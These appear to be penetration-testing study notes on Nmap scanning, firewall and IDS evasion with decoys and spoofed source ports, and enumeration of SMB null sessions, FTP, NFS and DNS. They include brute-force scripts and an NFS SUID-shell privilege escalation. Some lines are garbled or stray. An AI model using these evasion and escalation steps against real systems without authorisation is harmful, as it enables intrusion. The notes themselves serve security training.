	--osscan-limit: Limit OS detection to promising targets //If you have to scan thousands of hosts you could at first limit OS reconnaissance to just the promising ones.
	--osscan-guess: Guess OS more aggressively

####Scan types:
* SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan 
	-sT: TCP connect scan. This type of scan gets recorded in the application logs.
	-sU: UDP scan. It's usually used with --top-ports [20 for example]
	-sS: SYN scan. A well-configured IDS will still detect the scan
	-sV: Version detection scan. Nmap performs a TCP connect scan and reads from the banner of the daemon listening on a port. This is not stealthy but very useful.
	-sN: TCP Null scans. When the TCP request is sent with no flags set at all. As per the RFC, the target host should respond with a RST if the port is closed.
	-sF: TCP FIN scans. Instead of sending a completely empty packet, a request is sent with the FIN flag (usually used to gracefully close an active connection). Once again, Nmap expects a RST if the port is closed.
	-sX: TCP Xmas scans. Send a malformed TCP packet and expects a RST response for closed ports. It's referred to as an xmas scan as the flags that it sets (PSH, URG and FIN)
* Specifying targets by DNS name
	nmap <scan type> target1.domain.com target2.otherdomain.com

#####Spotting a firewall
* You might often see that a version was not recognized regardless of the open port or that even the service type is not recognized. For example, 'tcpwrapped' means that the TCP handshake was completed but the remote host closed the connection without receiving any data.
* Using --reason. 
	-f:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
        An alternative to -f, but providing more control over the size of the packets: 
	--mtu <number>, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
    	--scan-delay <time>ms:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
    	--badsum:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

####Firewall and IDS/IPS evasion
* Nmap's TCP ACK scan (-sA) method is much harder to filter for firewalls and IDS/IPS systems than regular SYN (-sS) or Connect scans (sT) because they only send a TCP packet with only the ACK flag. When a port is closed or open, the host must respond with an RST flag. Unlike outgoing connections, all connection attempts (with the SYN flag) from external networks are usually blocked by firewalls. However, the packets with the ACK flag are often passed by the firewall because the firewall cannot determine whether the connection was first established from the external network or the internal network.
	sudo nmap 10.129.2.28 -p 21,22,25 -sA -Pn -n --disable-arp-ping --packet-trace
* Example
	> Pay attention to the RCVD packets and its set flag we receive from our target. With the SYN scan (-sS) our target tries to establish the TCP connection by sending a packet back with the SYN-ACK (SA) flags set and with the ACK scan (-sA) we get the RST flag because TCP port 22 is open. For the TCP port 25, we do not receive any packets back, which indicates that the packets will be dropped.
* VPS: Several virtual private servers (VPS) with different IP addresses are recommended to determine whether such systems like IDS or IPS are on the target network during a penetration test
* Decoys
	> There are cases in which administrators block specific subnets from different regions in principle. This prevents any access to the target network. Another example is when IPS should block us. For this reason, the Decoy scanning method (-D) is the right choice. With this method, Nmap generates various random IP addresses inserted into the IP header to disguise the origin of the packet sent. With this method, we can generate random (RND) a specific number (for example: 5) of IP addresses separated by a colon (:). Our real IP address is then randomly placed between the generated IP addresses. In the next example, our real IP address is therefore placed in the second position. Another critical point is that the decoys must be alive. Otherwise, the service on the target may be unreachable due to SYN-flooding security mechanisms.
	sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
	> The spoofed packets are often filtered out by ISPs and routers, even though they come from the same network range. Therefore, we can also specify our VPS servers' IP addresses and use them in combination with "IP ID" manipulation in the IP headers to scan the target.
	> Another scenario would be that only individual subnets would not have access to the server's specific services. So we can also manually specify the source IP address (-S) to test if we get better results with this one. Decoys can be used for SYN, ACK, ICMP scans, and OS detection scans
		sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
* DNS proxying
	> By default, Nmap performs a reverse DNS resolution unless otherwise specified to find more important information about our target. These DNS queries are also passed in most cases because the given web server is supposed to be found and visited. The DNS queries are made over the UDP port 53. The TCP port 53 was previously only used for the so-called "Zone transfers" between the DNS servers or data transfer larger than 512 bytes. More and more, this is changing due to IPv6 and DNSSEC expansions. These changes cause many DNS requests to be made via TCP port 53.
	> However, Nmap still gives us a way to specify DNS servers ourselves (--dns-server <ns>,<ns>). This method could be fundamental to us if we are in a demilitarized zone (DMZ). The company's DNS servers are usually more trusted than those from the Internet. So, for example, we could use them to interact with the hosts of the internal network. As another example, we can use TCP port 53 as a source port (--source-port) for our scans. If the administrator uses the firewall to control this port and does not filter IDS/IPS properly, our TCP packets will be trusted and passed through.
		sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
	> Now that we have found out that the firewall accepts TCP port 53, it is very likely that IDS/IPS filters might also be configured much weaker than others. We can test this by trying to connect to this port by using Netcat.
		ncat -nv --source-port 53 10.129.2.28 50000

####Nmap scripting engine
* Category	Description
	auth		Determination of authentication credentials.
	broadcast	Scripts, which are used for host discovery by broadcasting and the discovered hosts, can be automatically added to the remaining scans.
	brute		Executes scripts that try to log in to the respective service by brute-forcing with credentials.
	default		Default scripts executed by using the -sC option.

	malware		Checks if some malware infects the target system.
	safe		Defensive scripts that do not perform intrusive and destructive access.
	version		Extension for service detection.
	vuln		Identification of specific vulnerabilities.
* Default scripts
	sudo nmap <target> -sC
* Specified scripts category
	sudo nmap <target> --script <category>
	sudo nmap 10.129.2.28 -p 80 -sV --script vuln
* Defined scripts
	sudo nmap <target> --script <script-name>,<script-name>,...
	sudo nmap 10.129.2.28 -p 25 --script banner,smtp-commands
####Performance
* Timeouts
	> When Nmap sends a packet, it takes some time (Round-Trip-Time - RTT) to receive a response from the scanned port. Generally, Nmap starts with a high timeout (--min-RTT-timeout) of 100ms.
	> Default scan
		sudo nmap 10.129.2.0/24 -F
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 39.44 seconds
	> Optimized RTT
		sudo nmap 10.129.2.0/24 -F --initial-rtt-timeout 50ms --max-rtt-timeout 100ms
		<SNIP>
		Nmap done: 256 IP addresses (8 hosts up) scanned in 12.29 seconds
	> From this, we can conclude that setting the initial RTT timeout (--initial-rtt-timeout) to too short a time period may cause us to overlook hosts.
* Max retries
	> Another way to increase the scans' speed is to specify the retry rate of the sent packets (--max-retries). The default value for the retry rate is 10, so if Nmap does not receive a response for a port, it will not send any more packets to the port and will be skipped.
	> Default scan
		sudo nmap 10.129.2.0/24 -F | grep "/tcp" | wc -l
		23
	> Reduced retries
		sudo nmap 10.129.2.0/24 -F --max-retries 0 | grep "/tcp" | wc -l
		21
	> Again, we recognize that accelerating can also have a negative effect on our results, which means we can overlook important information.
* Rates	
	> During a white-box penetration test, we may get whitelisted for the security systems to check the systems in the network for vulnerabilities and not only test the protection measures. If we know the network bandwidth, we can work with the rate of packets sent, which significantly speeds up our scans with Nmap. When setting the minimum rate (--min-rate <number>) for sending packets, we tell Nmap to simultaneously send the specified number of packets. It will attempt to maintain the rate accordingly.
	> Default scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.default
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 29.83 seconds
	> Optimized scan
		sudo nmap 10.129.2.0/24 -F -oN tnet.minrate300 --min-rate 300
		<SNIP>
		Nmap done: 256 IP addresses (10 hosts up) scanned in 8.67 seconds
* Timing
> The default timing template used when we have defined nothing else is the normal (-T 3)
	T 0 / -T paranoid
	T 1 / -T sneaky
    	T 2 / -T polite
    	T 3 / -T normal
    	T 4 / -T aggressive

###Footprinting, scanning & enumeration
####SMB, Samba & NetBIOS [RPC included]
* Servers and clients use NetBIOS (Network Basic Input Output System) when viewing network shares on the LAN. NetBIOS can supply some of the following information when querying a computer:
    	> Hostname
    	> NetBIOS name
    	> Domain
    	> Network shares
* NetBIOS layer sits between the application layer and the IP layer
    	> UDP port 137 ==> NetBIOS names resolution. To find workgroups
    	> UDP port 138 ==> NetBIOS datagrams. A host can send small messages to many other hosts. To list the shares and the machines
    	> TCP port 139 ==> NetBIOS session. Heavy traffic, such as a file copy. To transmit data to and from a Windows share
* SMB
	> In IP networks, SMB uses TCP protocol for this purpose, which provides for a three-way handshake between client and server before a connection is finally established. The specifications of the TCP protocol also govern the subsequent transport of data. We can take a look at some examples here ==> https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-SMB2/%5bMS-SMB2%5d.pdf#%5B%7B%22num%22%3A920%2C%22gen%22%3A0%7D%2C%7B%22name%22%3A%22XYZ%22%7D%2C69%2C738%2C0%5D
	> An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by Access Control Lists (ACL). They can be controlled in a fine-grained manner based on attributes such as execute, read, and full access for individual users or user groups. The ACLs are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.

	> Originally, SMB ran on top of NetBIOS using port 139
      	The SMB protocol utilizes two levels of authentication(Both of these authentication levels utilize a challenge response authentication system), namely:
      		+ User authentication: Users must provide a username and password in order to authenticate with the SMB server in order to access a share
      	  	+ Share authentication: Users must provide a password in order to access restricted share
* Samba
	> There is an alternative variant to the SMB server, called Samba, developed for Unix-based operating system. Samba implements the Common Internet File System (CIFS) network protocol. CIFS is a "dialect" of SMB. In other words, CIFS is a very specific implementation of the SMB protocol, which in turn was created by Microsoft. This allows Samba to communicate with newer Windows systems. Therefore, it usually is referred to as SMB / CIFS. However, CIFS is the extension of the SMB protocol. So when we pass SMB commands over Samba to an older NetBIOS service, it usually connects to the Samba server over TCP ports 137, 138, 139, but CIFS uses TCP port 445 only. There are several versions of SMB, including outdated versions that are still used in specific infrastructures.
	SMB Version	Supported				Features
	CIFS		Windows NT 4.0				Communication via NetBIOS interface
	SMB 1.0		Windows 2000				Direct connection via TCP
	SMB 2.0		Windows Vista, Windows Server 2008	Performance upgrades, improved message signing, caching feature
	SMB 2.1		Windows 7, Windows Server 2008 R2	Locking mechanisms
	SMB 3.0		Windows 8, Windows Server 2012		Multichannel connections, end-to-end encryption, remote storage access
	SMB 3.0.2	Windows 8.1, Windows Server 2012 R2	
	SMB 3.1.1	Windows 10, Windows Server 2016		Integrity checking, AES-128 encryption

	> With version 3, the Samba server gained the ability to be a full member of an Active Directory domain. With version 4, Samba even provides an Active Directory domain controller. It contains several so-called daemons for this purpose - which are Unix background programs. The SMB server daemon (smbd) belonging to Samba provides the first two functionalities, while the NetBIOS message block daemon (nmbd) implements the last two functionalities. The SMB service controls these two background programs.

	> We know that Samba is suitable for both Linux and Windows systems. In a network, each host participates in the same workgroup. A workgroup is a group name that identifies an arbitrary collection of computers and their resources on an SMB network. There can be multiple workgroups on the network at any given time. IBM developed an application programming interface (API) for networking computers called the Network Basic Input/Output System (NetBIOS). The NetBIOS API provided a blueprint for an application to connect and share data with other computers. In a NetBIOS environment, when a machine goes online, it needs a name, which is done through the so-called name registration procedure. Either each host reserves its hostname on the network, or the NetBIOS Name Server (NBNS => https://networkencyclopedia.com/netbios-name-server-nbns/) is used for this purpose. It also has been enhanced to Windows Internet Name Service (WINS => https://networkencyclopedia.com/windows-internet-name-service-wins/).

			!cat pre-prod.txt
	> From the administrative point of view, we can check these connections using smbstatus. Apart from the Samba version, we can also see who, from which host, and which share the client is connected. This is especially important once we have entered a subnet (perhaps even an isolated one) that the others can still access. For example, with domain-level security, the samba server acts as a member of a Windows domain. Each domain has at least one domain controller, usually a Windows NT server providing password authentication. This domain controller provides the workgroup with a definitive password server. The domain controllers keep track of users and passwords in their own Security Authentication Module (SAM) and authenticate each user when they log in for the first time and wish to access another machine's share.

* Creating network shares is fairly easy. Generally, users just need to turn on the:
    	> 'File and Printer Sharing' service
    	[+] Starting from Windows Vista, users can choose to share:
    		> Single file
    		  	They can choose local or remote users to share the file with
    		> Public directory
    		  	They can choose which local users can access the files on the share, but they can ONLY allow everyone or no one in the network to access the share

    		> UNC Paths
    			An authorized user can access shares by using Universal Naming Convention paths. The format of a UNC path is:
    		  		\\ServerName\ShareName\file.txt

    		> Administrative shares
    			There are also some special default administrative shares which are used by system administrators and Windows itself:
    				\\ComputerName\C$ 
    		    			Lets an administrator access a volume on the local machine. Every volume has a share (C$, D$, E$, etc)
    		    		\\ComputerName\admin$
    		    			Points to the windows installation directory
    		    		\\ComputerName\ipc$ 
    		    			Is used for inter-process communication. You cannot browse it via Windows Explorer. The IPC$ share is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares
* Enumerating Windows Shares
	> In Windows OS 
    		> nbtstat -A <target IP> //Displays information about a target
    		  	Example of results
    		  		ELS-WINXP <00> UNIQUE Registered 
    		  	    	ELS-WINXP <20> UNIQUE Registered 
    		  	    		  <00> : Tells us that ELS-WINXP is a workstation 
    		  	    	UNIQUE: This computer must have only one IP address assigned
    		  	    		  <20> : Tells us that the file sharing service is up and running on the machine.
    		> net view <target IP>
    	> In LinuxOS 
    		> nbmlookup -A <target IP>
    	    		If <20>, there is a server that we can actually connect to it.
    		> smbclient -L //<IP> -N //It also displays administrative shares that are hidden when using Windows standard tools
		  smbclient \\\\10.129.42.253\\users -U bob
    	  	> nbtscan -r 192.168.188.0/24

* Null sessions: Nowadays Windows is configured to be inmune from this kind of attack. However, legacy hosts can still be vulnerable. Check it:
  	> In Windows
  		net use \\<target IP address>\IPC$ '' /u:'' //IPC$ is an example
  	> In Linux
  	  	smbclient //<target IP address>/IPC$ -N
  	> We could automate this:
  	  	while IFS= read -r users; do smbclient //demo.ine.local/$users -N;done < users.txt
  	> Instead of downloading the file locally, we could see it with the '-'. This parameter is the local file where the content of remote file must be saved.
  	  	get flag_1 -

	[+] Exploiting Null sessions

####FTP
* The File Transfer Protocol (FTP) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as HTTP or POP. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol.
* Let us imagine that we want to upload local files to a server and download other files using the FTP protocol. In an FTP connection, two channels are opened. First, the client and server establish a control channel through TCP port 21. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via TCP port 20. This channel is used exclusively for data transmission, and the protocol watches for errors during this process. If a connection is broken off during transmission, the transport can be resumed after re-established contact.
* A distinction is made between active and passive FTP. In the active variant, the client establishes the connection as described via TCP port 21 and thus informs the server via which client-side port the server can transmit its responses. However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the passive mode has been developed. Here, the server announces a port through which the client can establish the data channel. Since the client initiates the connection in this method, the firewall does not block the transfer.

* FTP server status codes
	https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes
* TFTP
	> Trivial File Transfer Protocol (TFTP) is simpler than FTP and performs file transfers between client and server processes. However, it does not provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses UDP, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.

	> This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user's authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks
	> Unlike the FTP client, TFTP does not have directory listing functionality.
	> Few commands
		Commands	Description
		connect		Sets the remote host, and optionally the port, for file transfers.
		get		Transfers a file or set of files from the remote host to the local host.
		put		Transfers a file or set of files from the local host onto the remote host.
		quit		Exits tftp.
		status		Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on.
		verbose		Turns verbose mode, which displays additional information during file transfer, on or off.
* Default configuration
	> One of the most used FTP servers on Linux-based distributions is vsFTPd. The default configuration of vsFTPd can be found in /etc/vsftpd.conf, and some settings are already predefined by default. The configuration file does not contain all possible settings that can be made
	❯ cat /etc/vsftpd.conf  | grep -v '#'
	Setting							Description
	listen=NO						Run from inetd or as a standalone daemon?
	listen_ipv6=YES						Listen on IPv6 ?
	anonymous_enable=NO					Enable Anonymous access?
	local_enable=YES					Allow local users to login?
	dirmessage_enable=YES					Display active directory messages when users go into certain directories?
	use_localtime=YES					Use local time?
	xferlog_enable=YES					Activate logging of uploads/downloads?
	connect_from_port_20=YES				Connect from port 20?
	secure_chroot_dir=/var/run/vsftpd/empty			Name of an empty directory
	pam_service_name=vsftpd					This string is the name of the PAM service vsftpd will use.
	rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem	The last three options specify the location of the RSA certificate to use for SSL encrypted connections.
	rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key	
	ssl_enable=NO
	> In addition, there is a file called /etc/ftpusers that we also need to pay attention to, as this file is used to deny certain users access to the FTP service. In the following example, the users guest, john, and kevin are not permitted to log in to the FTP service, even if they exist on the Linux system
	[+] With vsFTPd, the optional(http://vsftpd.beasts.org/vsftpd_conf.html)settings that can be added to the configuration file for the anonymous login look like this.Dangerous settings!!
	Setting				Description
	anonymous_enable=YES		Allowing anonymous login?
	anon_upload_enable=YES		Allowing anonymous to upload files?
	anon_mkdir_write_enable=YES	Allowing anonymous to create new directories?
	no_anon_password=YES		Do not ask anonymous for password?
	anon_root=/home/username/ftp	Directory for anonymous.
	write_enable=YES		Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE?

* After connecting
	status
	debug
	trace
* Other settings
	Setting	Description	Setting	Description
	dirmessage_enable=YES	Show a message when they first enter a new directory?	
	chown_uploads=YES	Change ownership of anonymously uploaded files?	
	chown_username=username	User who is given ownership of anonymously uploaded files.
	local_enable=YES	Enable local users to login?
	chroot_local_user=YES	Place local users into their home directory?
	chroot_list_enable=YES	Use a list of local users that will be placed in their home directory?
	hide_ids=YES		All user and group information in directory listings will be displayed as "ftp".
	ls_recurse_enable=YES	Allows the use of recurse listings.
	
	> If the hide_ids=YES setting is present, the UID and GUID representation of the service will be overwritten, making it more difficult for us to identify with which rights these files are written and uploaded. This setting is a security feature to prevent local usernames from being revealed. With the usernames, we could attack the services like FTP and SSH and many others with a brute-force attack in theory. However, in reality, fail2ban solutions are now a standard implementation of any infrastructure that logs the IP address and blocks all access to the infrastructure after a certain number of failed login attempts.

	> Another helpful setting we can use for our purposes is the ls_recurse_enable=YES. This is often set on the vsFTPd server to have a better overview of the FTP directory structure, as it allows us to see all the visible content at once.
		ls -R
* Downloading files from such an FTP server is one of the main features, as well as uploading files created by us. This allows us, for example, to use LFI vulnerabilities to make the host execute system commands. Apart from the files, we can view, download and inspect. Attacks are also possible with the FTP logs, leading to Remote Command Execution (RCE). This applies to the FTP services and all those we can detect during our enumeration phase.
	get Important\ Notes.txt ==> One file
	wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 ==> Download all available files
* Next, we can check if we have the permissions to upload files to the FTP server. Especially with web servers, it is common that files are synchronized, and the developers have quick access to the files. FTP is often used for this purpose, and most of the time, configuration errors are found on servers that the administrators think are not discoverable. The attitude that internal network components cannot be accessed from the outside means that the hardening of internal systems is often neglected and leads to misconfigurations. The ability to upload files to the FTP server connected to a web server increases the likelihood of gaining direct access to the webserver and even a reverse shell that allows us to execute internal system commands and perhaps even escalate our privileges.

* Nmap
	> Update this databse of NSE scripts
		sudo nmap --script-updatedb
	> Find nmap FTP scripts
		find / -type f -name ftp* 2>/dev/null | grep scripts
		ftp-anon ==> anonymous access
		ftp-syst ==> STAT command
	--script-trace ==> This lets us see what commands Nmap sends, what ports are used, and what responses we receive from the scanned server
    	nmap 192.168.188.128 --script ftp-brute --script-args userdb=/root/users -p 21
    	anonymous login

	telnet 10.129.14.136 21
	openssl s_client -connect 10.129.14.136:21 -starttls ftp
		The SSL certificate allows us to recognize the hostname, for example, and in most cases also an email address for the organization or company. In addition, if the company has several locations worldwide, certificates can also be created for specific locations, which can also be identified using the SSL certificate.

####NFS
* Network File System (NFS) is a network file system developed by Sun Microsystems and has the same purpose as SMB. Its purpose is to access file systems over a network as if they were local. However, it uses an entirely different protocol. NFS is used between Linux and Unix systems. This means that NFS clients cannot communicate directly with SMB servers. NFS is an Internet standard that governs the procedures in a distributed file system. While NFS protocol version 3.0 (NFSv3), which has been in use for many years, authenticates the client computer, this changes with NFSv4. Here, as with the Windows SMB protocol, the user must authenticate.
* Versions
	Version	Features
	NFSv2	It is older but is supported by many systems and was initially operated entirely over UDP.
	NFSv3	It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.
	NFSv4	It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.
* NFS version 4.1 (RFC 8881) aims to provide protocol support to leverage cluster server deployments, including the ability to provide scalable parallel access to files distributed across multiple servers (pNFS extension). In addition, NFSv4.1 includes a session trunking mechanism, also known as NFS multipathing. A significant advantage of NFSv4 over its predecessors is that only one UDP or TCP port 2049 is used to run the service, which simplifies the use of the protocol across firewalls.

* NFS is based on the Open Network Computing Remote Procedure Call (ONC-RPC/SUN-RPC) protocol exposed on TCP and UDP ports 111, which uses External Data Representation (XDR) for the system-independent exchange of data. The NFS protocol has no mechanism for authentication or authorization. Instead, authentication is completely shifted to the RPC protocol's options. The authorization is taken from the available information of the file system where the server is responsible for translating the user information supplied by the client to that of the file system and converting the corresponding authorization information as correctly as possible into the syntax required by UNIX.

* The most common authentication is via UNIX UID/GID and group memberships, which is why this syntax is most likely to be applied to the NFS protocol. One problem is that the client and server do not necessarily have to have the same mappings of UID/GID to users and groups, and the server does not need to do anything further. No further checks can be made on the part of the server. This is why NFS should only be used with this authentication method in trusted networks.

[+] Default configuration
	> NFS is not difficult to configure because there are not as many options as FTP or SMB have. The /etc/exports file contains a table of physical filesystems on an NFS server accessible by the clients. The NFS Exports Table shows which options it accepts and thus indicates which options are available to us ==> http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html

		cat /etc/exports
* Additional options
	> The default exports file also contains some examples of configuring NFS shares. First, the folder is specified and made available to others, and then the rights they will have on this NFS share are connected to a host or a subnet. Finally, additional options can be added to the hosts or subnets

		Option			Description
		rw			Read and write permissions.
		ro			Read only permissions.
		sync			Synchronous data transfer. (A bit slower)
		async			Asynchronous data transfer. (A bit faster)
		secure			Ports above 1024 will not be used.
		insecure		Ports above 1024 will be used.
		no_subtree_check	This option disables the checking of subdirectory trees.
		root_squash		Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents root from accessing files on an NFS mount.
	[+] Example
		echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
		systemctl restart nfs-kernel-server
		exportfs
[+] Dangerous settings
	Option		Description
	rw		Read and write permissions.
	insecure	Ports above 1024 will be used ==> This is dangerous because users can use ports above 1024. The first 1024 ports can only be used by root. This prevents the fact that no users can use sockets above port 1024 for the NFS service and interact with it.
	nohide		If another file system was mounted below an exported directory, this directory is exported by its own exports entry.
	no_root_squash	All files created by root are kept with the UID/GID 0.
[+] Nmap
	sudo nmap 10.129.14.128 -p111,2049 -sV -sC
	sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

* Once we have discovered such an NFS service, we can mount it on our local machine. For this, we can create a new empty folder to which the NFS share will be mounted. Once mounted, we can navigate it and view the contents just like our local system. 
	> Show availabale NFS shares
		showmount -e 10.129.14.128
	> Mounting NFS share
		mkdir target-NFS
		mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
		cd target-NFS
		tree .
* List contents with usernames & group names
	ls -l mnt/nfs/
	ls -n mnt/nfs/
* It is important to note that if the root_squash option is set, we cannot edit the backup.sh[a example file] file even as root.

* Privesc
	> We can also use NFS for further escalation. For example, if we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the SUID of that user and then run the shell via the SSH user.

* Unmounting
	cd ..
	umount ./target-NFS

* Other commands
  	sudo apt install nfs-common
  	sudo mount -t nfs IP:share /tmp/mount/ -nolock
  	/usr/sbin/showmount -e 10.10.236.98: To list the NFS shares
 	./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

[+] Types of DNS servers
	> DNS Root Server	==> The root servers of the DNS are responsible for the top-level domains (TLD). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The Internet Corporation for Assigned Names and Numbers (ICANN) coordinates the work of the root name servers. There are 13 such root servers around the globe.
    * TLDs nameservers, the Top-Level Domains, might be compared to a single shelf of books in a library. The last portion of a hostname is hosted by this nameserver, which is the following stage in the search for a specific IP address (in www.facebook.com, the TLD server is com). Most TLDs have been delegated to individual country managers, who are issued codes from the ISO-3166-1 table. These are known as country-code Top-Level Domains or ccTLDs managed by a United Nations agency.
    * There are also a small number of "generic" Top Level Domains (gTLDs) that are not associated with a specific country or region. TLD managers have been granted responsibility for procedures and policies for the assignment of Second Level Domain Names (SLDs) and lower level hierarchies of names, according to the policy advice specified in ISO-3166-1.
    *A manager for each nation organizes country code domains. These managers provide a public service on behalf of the Internet community. Resource Records are the results of DNS queries and have the following structure:
	
      Resource Record:          A domain name, usually a fully qualified domain name, is the first part of a Resource Record. 
                                If you don't use a fully qualified domain name, the zone's name where the record is located will be appended to the end of the name.
      TTL:	                    In seconds, the Time-To-Live (TTL) defaults to the minimum value specified in the SOA record.
      Record Class	            Internet, Hesiod, or Chaos
      Start Of Authority (SOA):	It should be first in a zone file because it indicates the start of a zone. Each zone can only have one SOA record, and additionally, 
                                it contains the zone's values, such as a serial number and multiple expiration timeouts.
      Name Servers (NS):        The distributed database is bound together by NS Records. They are in charge of a zone's authoritative name server and the 
                                authority for a child zone to a name server.
      IPv4 Addresses (A)	      The A record is only a mapping between a hostname and an IP address. 'Forward' zones are those with A records.
      Pointer (PTR)	            The PTR record is a mapping between an IP address and a hostname. 'Reverse' zones are those that have PTR records.
      Canonical Name (CNAME)	  An alias hostname is mapped to an A record hostname using the CNAME record.
      Mail Exchange (MX)	      The MX record identifies a host that will accept emails for a specific host. A priority value has been assigned to the specified host. 
                                Multiple MX records can exist on the same host, and a prioritized list is made consisting of the records for a specific host.




	> Authoritative Nameserver ==> Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point.
	> Non-authoritative Nameserver ==> Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.
	> Caching DNS Server ==> Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.
	> Forwarding Server ==>	Forwarding servers perform only one function: they forward DNS queries to another DNS server.
	> Resolver ==> Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.
* DNS is mainly unencrypted. Devices on the local WLAN and Internet providers can therefore hack in and spy on DNS queries. Since this poses a privacy risk, there are now some solutions for DNS encryption. By default, IT security professionals apply DNS over TLS (DoT) or DNS over HTTPS (DoH) here. In addition, the network protocol NSCrypt also encrypts the traffic between the computer and the name server.
* However, the DNS does not only link computer names and IP addresses. It also stores and outputs additional information about the services associated with a domain. A DNS query can therefore also be used, for example, to determine which computer serves as the e-mail server for the domain in question or what the domain's name servers are called.

[+] Some DNS records
        A     - Resolves a hostname or domain to an IPv4 address
        AAAA  - Resolves a hostname or domain to an IPv6 address
        NS    - Reference to the domains nameserver. These kinds of records show which name servers are used to resolve the FQDN to IP addresses. Most hosting providers use their own name servers, making it easier to identify the hosting provider.
        MX    - Resolves a domain to a mail server. The mail server records show us which mail server is responsible for managing the emails for the company
        CNAME - Used for domain aliases. If the domain www.hackthebox.eu should point to the same IP, and we create an A record for one and a CNAME record for the other.
        PTR   - The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.
        TXT   - Text record. This type of record often contains verification keys for different third-party providers and other security aspects of DNS, such as SPF, DMARC, and DKIM, which are responsible for verifying and confirming the origin of the emails sent
        HINFO - Host information
        SOA   - Domain authority. Provides information about the corresponding DNS zone and email address of the administrative contact.
		The SOA record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.
			dig soa inlanefreight.com
		The dot (.) is replaced by an at sign (@) in the email address. In this example, the email address of the administrator is awsdns-hostmaster@amazon.com.
        SRV   - Service records

  > So far, we have gathered A, NS, MX, and CNAME records with the nslookup and dig commands. Organizations are given IP addresses on the Internet, but they aren't always their owners. They might rely on ISPs and hosting provides that lease smaller netblocks to them. We can combine some of the results gathered via nslookup with the whois database to determine if our target organization uses hosting providers. This combination looks like the following example:





[+] Default configuration
	> There are many different configuration types for DNS. Therefore, we will only discuss the most important ones to illustrate better the functional principle from an administrative point of view. All DNS servers work with three different types of configuration files:
		Local DNS configuration files
    		Zone files
    		Reverse name resolution files

	> The DNS server Bind9 is very often used on Linux-based distributions. Its local configuration file (named.conf) is roughly divided into two sections, firstly the options section for general settings and secondly the zone entries for the individual domains. The local configuration files are usually:
    		named.conf.local
    		named.conf.options
    		named.conf.log
	>  The configuration file named.conf is divided into several options that control the behavior of the name server. A distinction is made between global options and zone options. Global options are general and affect all zones. A zone option only affects the zone to which it is assigned. Options not listed in named.conf have default values. If an option is both global and zone-specific, then the zone option takes precedence

		cat /etc/bind/named.conf.local

	> In this file, we can define the different zones. These zones are divided into individual files, which in most cases are mainly intended for one domain only. Exceptions are ISP and public DNS servers. In addition, many different options extend or reduce the functionality. We can look these up on the documentation of Bind9.

	> A zone file is a text file that describes a DNS zone with the BIND file format. In other words it is a point of delegation in the DNS tree. The BIND file format is the industry-preferred zone file format and is now well established in DNS server software. A zone file describes a zone completely. There must be precisely one SOA record and at least one NS record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files. A syntax error usually results in the entire zone file being considered unusable. The name server behaves similarly as if this zone did not exist. It responds to DNS queries with a SERVFAIL error message.

